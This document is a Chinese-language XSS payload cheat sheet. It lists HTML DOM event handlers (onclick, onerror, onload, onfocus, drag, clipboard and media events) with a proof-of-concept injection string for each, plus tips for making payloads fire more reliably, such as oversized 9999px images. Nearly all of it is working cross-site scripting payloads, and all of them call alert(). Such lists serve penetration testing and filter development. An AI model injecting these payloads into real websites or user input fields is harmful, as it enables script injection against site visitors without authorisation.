###  ###HTML DOM 事件###

来源：[https://www.runoob.com/jsref/dom-obj-event.html](https://www.runoob.com/jsref/dom-obj-event.html)

 **happy xss** 

### 鼠标事件

***onclick*** 

```
点击鼠标左键触发。
```
poc
```
<img src=x onclick=alert(1)>
<a href='a' onclick=alert(1)>
<svg onclick=alert(1)>
<button onclick="alert()">点我</button>
```

**oncontextmenu**

```
点击鼠标右键触发，适用标签div、img、svg，建议使用img，嵌套一样width=9999px，height=9999px的图片，触发概率高。
```
poc
```
<img src=x width=9999px height=9999px oncontextmenu="alert()">

```

**ondblclick**
```
鼠标双击触发，适用标签p、img、svg等。
```

poc

```
<p ondblclick="alert()">双击这段触发一个函数</p>
<svg ondblclick="alert()">
<img src=x width=9999px height=9999px ondblclick="alert()">
```

**onmousedown,onmouseup**

```
点击鼠标左键触发，和onclick差不多。
```

poc

```
<img src=x width=9999px height=9999px onmousedown=alert(1)>
<a href='a' onmousedown=alert(1)>aaa</a>
<svg onmousedown=alert(1) width=9999px height=9999px>
<button onmousedown="alert()">点我</button>
<p onmousedown="alert()">点击触发</p>
<img src=x onmouseup=alert(1)>
<a href='a' onmouseup=alert(1)>aaa</a>
<svg onmouseup=alert(1)>
<button onmouseup="alert()">点我</button>
<p onmouseup="alert()">点击触发</p>

```

**onmouseenter**
```
鼠标移动到指定点触发。
```

poc

```
<img onmouseenter="alert(1)" src="x.gif" width="9999" height="9999">
<svg onmouseenter="alert(1)" width="9999" height="9999">
```


**onmouseleave,onmouseout**
```
在鼠标指针移出指针时执行。
```

poc

```
<img onmouseleave="alert(1)" src="x.gif" width="9999" height="9999">
<svg onmouseleave="alert(1)" width="9999" height="9999">
<img onmouseout="alert(1)" src="x.gif" width="9999" height="9999">
<svg onmouseout="alert(1)" width="9999" height="9999">
```

**onmousemove,onmouseover**

```
鼠标在指定区域移动触发。
```

poc

```
<img onmousemove="alert(1)" src="x.gif" width="9999" height="9999">
<svg onmousemove="alert(1)" width="9999" height="9999">
<img onmouseover="alert(1)" src="x.gif" width="9999" height="9999">
<svg onmouseover="alert(1)" width="9999" height="9999">
```

### 键盘事件

**onkeydown,onkeypress,onkeyup**

```
这三个都差不多，都是输入按键触发。
```
poc
```
<input type="text" onkeyup="alert(1)">
```


### 框架/对象（Frame/Object）事件

**onerror**
```
如果在加载图片时发生错误则执行 JavaScript，这个使用频率最高的，一般用于img。
```
poc
```
<img src=x onerror=alert(1)>
```

**onload**
```
当页面载入完毕后执行Javascript代码
```
poc
```
<svg onload=alert(1)>
<body onload="alert()">
```

**onpageshow**
```
在用户浏览网页时触发 JavaScript
```
poc
```
<body onpageshow="alert()">
```

**onresize**
```
有点像onpageshow，浏览网页直接触发。
```
poc
```
<svg onresize=alert(1)>
<body onresize="alert()">
```

**onscroll**
```
<div> 元素滚动时执行 JavaScript，比较鸡肋，只有在DIV标签下才能触发
```
poc
```
<style>
div {
    border: 1px solid black;
    width: 200px;
    height: 100px;
    overflow: scroll;
}
</style>

<div onscroll="alert(1)">In my younger and more vulnerable years my father gave me some advice that I've been turning over in my mind ever since.
</div>
```
**onunload**
```
当用户未载入文档时执行的Javascript代码（F5刷新），比较鸡肋，只有IE有用。
```
poc
```
<body onunload="alert()">
```

### 表单事件

**onblur,onchange**
```
当用户离开input输入框时执行一段Javascript代码
```
poc
```
<input type="text" id="fname" onblur="alert()">
<textarea type="text"  onchange="alert(1)"></textarea>
```

**onfocus**
```
点击输入框触发
```
poc
```
<input type="text" id="fname" onfocus="alert()">
<textarea type="text"  onfocus="alert(1)"></textarea>
<body onfocus="alert(1)"></textarea>
```

**onfocusin**
```
点击输入框触发,svg点击框框即可触发,body无效。
```
poc
```
<input type="text" id="fname" onfocusin="alert()">
<textarea type="text"  onfocusin="alert(1)"></textarea>
<svg width=9999px height=9999px onfocusin="alert(1)">
```

**onfocusout**
```
当时鼠标点开输入框时触发
```
poc
```
<input type="text" id="fname" onfocusout="alert()">
<textarea type="text"  onfocusout="alert(1)"></textarea>
<svg width=9999px height=9999px onfocusout="alert(1)">
```

**oninput**
```
当用户在输入框输入时触发
```
poc
```
<input type="text" id="fname" oninput="alert()">
<textarea type="text"  oninput="alert(1)"></textarea>
<svg width=9999px height=9999px oninput="alert(1)">
```

**onreset**
```
点击按钮触发
```
poc
```
<form onreset="alert()">
	<input type="reset">
</form>
```

**onsearch**
```
输入框输入内容按enter触发
```
poc
```
<input type="search" id="myInput" onsearch="alert()">
```

**onselect**
```
当文本被选中时，执行一段 Javascript代码
```
poc
```
<input type="text" value="Hello world!" onselect="alert()">
```

**onsubmit**
```
点击按钮触发
```
poc
```
<form action="#" onsubmit="alert()">
  <input type="submit" value="提交">
</form>
```

### 剪贴板事件

**oncopy**
```
当文本被复制时触发
```
poc
```
<p oncopy="alert(1)">加我QQ：123456</p>
```

**onpaste**
```
选中文本后右键粘贴触发
```
poc
```
<p onpaste="myFunction()">尝试在段落中粘贴内容。</p>
```

### 拖动事件

**ondrag**
```
鼠标左键点击按住左键然后拖动触发
```
poc
```
<p draggable="true"  ondrag ="alert(1)" >拖动我!</p>
<img src=https://www.baidu.com/img/bd_logo1.png ondrag ="alert(1)">
<a href='a' ondrag=alert(1)>aaa</a>
```

**ondragend,ondragenter,ondragleave ,ondragover ,ondragstart **
```
完成拖动后触发，鉴于下面所有事件都差不多，所以直接一次列举出来
```
poc
```
<p draggable="true"  ondragend="alert(1)" >拖动我!</p>
<img src=https://www.baidu.com/img/bd_logo1.png ondragend="alert(1)">
<a href='a' ondragend=alert(1)>aaa</a>

<p draggable="true"  ondragenter="alert(1)" >拖动我!</p>
<img src=https://www.baidu.com/img/bd_logo1.png ondragenter="alert(1)">
<a href='a' ondragenter=alert(1)>aaa</a>


<p draggable="true"  ondragleave ="alert(1)" >拖动我!</p>
<img src=https://www.baidu.com/img/bd_logo1.png ondragleave ="alert(1)">
<a href='a' ondragleave =alert(1)>aaa</a>

<p draggable="true"  ondragover ="alert(1)" >拖动我!</p>
<img src=https://www.baidu.com/img/bd_logo1.png ondragover ="alert(1)">
<a href='a' ondragover =alert(1)>aaa</a>

<p draggable="true"  ondragstart ="alert(1)" >拖动我!</p>
<img src=https://www.baidu.com/img/bd_logo1.png ondragstart ="alert(1)">
<a href='a' ondragstart =alert(1)>aaa</a>

```

### 多媒体（Media）事件

**oncanplay,oncanplaythrough,ondurationchange,onloadeddata,onloadstart,onprogress**
```
访问就直接触发
```
poc
```
<video controls oncanplay="alert(1)">
<source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>


<video controls oncanplaythrough="alert()">
<source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>

<video controls ondurationchange="alert(1)">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>

<video controls onloadeddata="alert(1)">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>

<video controls onloadstart="alert(1)">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>


<video controls onprogress="alert(1)">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>

```
**onended**
```
播放结束后触发xss
```
poc
```
<audio controls onended="alert()">
    <source src="https://www.runoob.com/try/demo_source/horse.mp3" type="audio/mpeg">
</audio>
```

**onpause**
```
播放视频暂停触发
```
poc
```
<video width="320" height="240" controls onpause="alert()">
    <source src="https://www.runoob.com/try/demo_source/movie.mp4" type="video/mp4">
</video>
```

**onplay,onplaying,ontimeupdate**
```
点击视频播放时触发
```
poc
```
<video controls onplay="alert()">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>


<video controls onplaying="alert()">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>


<video controls ontimeupdate="alert()">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>
```

**onseeked,onseeking**
```
点击视频进度条快进或后退触发
```
poc
```
<video controls onseeked="alert()">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>


<video controls onseeking="alert()">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>
```

**onvolumechange**
```
视频调整音量时触发
```
poc
```
<video controls onvolumechange="alert()">
    <source src="https://www.runoob.com/try/demo_source/mov_bbb.mp4" type="video/mp4">
</video>
```

**onwaiting**
```
在视频由于要播放下一帧而需要缓冲时执行 JavaScript ，建议选择一个很大的视频。
```
poc
```
<video controls onwaiting="alert()">
    <source src="mov_bbb.mp4" type="video/mp4">
</video>
```

**onshow**
```
仅限firefox，右键触发
```
poc
```
<style>
div {
    background: yellow;
    border: 1px solid #cccccc;
    padding: 10px;
}
</style>
<div contextmenu="mymenu">
<p>用鼠标右键单击黄色框区域查看上下文菜单！</p>
<menu type="context" id="mymenu" onshow="alert()">
</menu>
</div>
```

**ontoggle**
```
鼠标点击触发
```
poc
```
<p>打开详细信息。</p>
<details ontoggle="alert()">
<summary>Copyright 1999-2014.</summary>
</details>
```

